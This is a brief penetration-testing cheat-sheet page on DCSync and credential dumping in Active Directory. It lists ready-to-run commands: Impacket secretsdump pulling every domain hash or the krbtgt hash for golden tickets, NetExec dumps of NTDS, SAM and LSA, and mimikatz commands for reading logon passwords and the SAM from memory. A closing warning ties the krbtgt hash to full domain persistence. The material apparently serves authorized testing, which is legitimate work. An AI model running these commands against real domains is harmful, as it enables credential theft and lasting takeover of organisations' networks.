---
title: "DCSync & Credential Dumping"
---

Once you have replication rights (Domain Admins, or an account with DS-Replication-Get-Changes), pull any hash from the DC without touching it.

```bash
# DCSync (Impacket) — dump the domain
secretsdump.py $DOMAIN/USER:PASS@$DC -just-dc
secretsdump.py $DOMAIN/USER:PASS@$DC -just-dc-user krbtgt   # for golden tickets
# NetExec
nxc smb $DC -u USER -p PASS --ntds
```

## Local credential dumping

```bash
# from SAM (local accounts) + LSA
secretsdump.py -sam sam.save -system system.save LOCAL
nxc smb $IP -u admin -H <hash> --sam --lsa
# Windows, in memory
mimikatz # sekurlsa::logonpasswords
mimikatz # lsadump::sam
```

<Warning>
`krbtgt` hash = golden ticket = full domain persistence. Treat it as the crown jewel and note it clearly in your report.
</Warning>
